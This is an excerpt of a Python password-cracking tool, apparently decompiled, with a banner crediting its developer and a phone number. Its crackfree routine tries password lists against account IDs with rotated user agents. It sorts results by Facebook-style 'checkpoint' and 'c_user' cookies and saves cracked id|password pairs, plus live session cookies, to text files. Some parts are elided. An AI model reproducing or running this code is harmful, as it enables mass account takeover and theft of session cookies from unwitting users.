...
def banner():
	print('\x1b[1;92m\n	 \t\x1b[1;91m██████╗░██╗██╗░░░██╗░█████╗░██████╗░\n	 \t\x1b[1;90m██╔══██╗██║╚██╗░██╔╝██╔══██╗██╔══██╗\n	 \t\x1b[1;93m██████╔╝██║░╚████╔╝░███████║██║░░██║\n	 \t\x1b[1;94m██╔══██╗██║░░╚██╔╝░░██╔══██║██║░░██║\n	 \t\x1b[1;97m██║░░██║██║░░░██║░░░██║░░██║██████╔╝\n	 \t\x1b[1;92m╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░\n\n ┌──────────────────────────────────────────────────────┐\n │[✓] DEVOLPER   :			ABUBOCKOR ADRIYAN [KING]	  │\n │[✓] WHATSAPP   :			+8801706870024			│\n │[✓] GITHUB	 :	 	ADRIYAN-HACKER-RIYAD		   │\n │[✓] TOOLS	  :			ADRIYAN-FILE-CLONING		  │\n │[✓] TEAM	   :			RRK					   │\n └──────────────────────────────────────────────────────┘\n	\n	\t \x1b[47m\x1b[1;31mTHE TOOL WILL BE UPDATED EVERY SEVEN DAYS\x1b[40m\x1b[00m\n		   ')
	...
	for pw in pwv:
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys():
				...
				print('')
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m[✓] STATUS		: \x1b[1;96mADRIYAN_CP')
				...
				print('')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] STATUS		: \x1b[1;96mADRIYAN_OK💚')
...
def crackfree(idf, pwv):
	global cp, ok, loop
	(sys.stdout.write(f"\r{b}ADRIYAN_CRACK{P} [{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}]  "),)
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
		...
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, 'ADRIYAN CP', **('title',)))
					open('ADRIYAN_CP.txt', 'a').write(idf + '|' + pw + '\n')
					akun.append(idf + '|' + pw)
					cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				headapp = {
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, 'ADRIYAN-KING  OK', **('title',)))
					ok += 1
				elif 'ya' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join(['%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('ADRIYAN_OK.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					user = idf
					infoakun = ''
					...
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, '[bold green]ADRIYAN_OK[/bold green]', **('title',)))
					ok += 1
				else:
					continue
			else:
